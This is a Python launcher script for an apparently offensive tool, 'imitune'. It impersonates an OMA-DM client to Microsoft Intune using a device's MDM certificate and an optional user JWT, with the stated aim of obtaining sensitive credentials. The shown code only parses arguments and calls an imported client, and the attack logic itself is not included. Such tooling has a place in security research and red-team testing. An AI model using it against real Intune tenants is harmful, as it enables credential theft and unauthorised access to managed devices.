#!/usr/bin/env python3
"""
imitunee.py
==============

This script mimicks an OMA-DM client to carry on a legitimate
OMA-DM session so that sensitive credentials can be obtained
while impersonating a user or device. This program works best
with an initialized nodeCache and managementTree.json files.
"""
import argparse
import sys

from imitune import oma_dm_client


def main():
    BANNER = r"""
██╗███╗   ███╗██╗████████╗██╗   ██╗███╗   ██╗███████╗
██║████╗ ████║██║╚══██╔══╝██║   ██║████╗  ██║██╔════╝
██║██╔████╔██║██║   ██║   ██║   ██║██╔██╗ ██║█████╗  
██║██║╚██╔╝██║██║   ██║   ██║   ██║██║╚██╗██║██╔══╝  
██║██║ ╚═╝ ██║██║   ██║   ╚██████╔╝██║ ╚████║███████╗
╚═╝╚═╝     ╚═╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝
              [ I M I T U N E ]
    """
    print(BANNER)
    parser = argparse.ArgumentParser(description="Getchu one")
    parser.add_argument("--device-name",
                        type=str,
                        help="The name of the device. This can be anything, \
                            and will be used for NodeCache generation",
                        required=True)
    parser.add_argument("--pfx-file-path",
                        type=str,
                        help="The path to the MDM certificate of the device.",
                        required=True)
    parser.add_argument("--pfx-password",
                        type=str,
                        help="The password used to encrypt the pfx file")
    parser.add_argument("--dummy-path",
                        required=False,
                        help="Path to a directory containing existing \
                            SyncML files for testing")
    parser.add_argument("--user-prompt", action='store_true', default=False)
    parser.add_argument("--output-directory", default=None, required=False)
    parser.add_argument("--user-jwt", default="", help="A base 64 encoded \
                        JWT for Intune to obtain user targeted setting")

    args = parser.parse_args()

    if not args.output_directory:
        args.output_directory = args.device_name

    try:
        client = oma_dm_client.OMADMClient(
            args.device_name,
            args.pfx_file_path,
            args.pfx_password,
            args.output_directory,
            args.dummy_path,
            args.user_prompt,
            args.user_jwt)

    except ValueError:
        print("[!] failed to initialize client")
        sys.exit()
    if client:
        client.intuneInit()
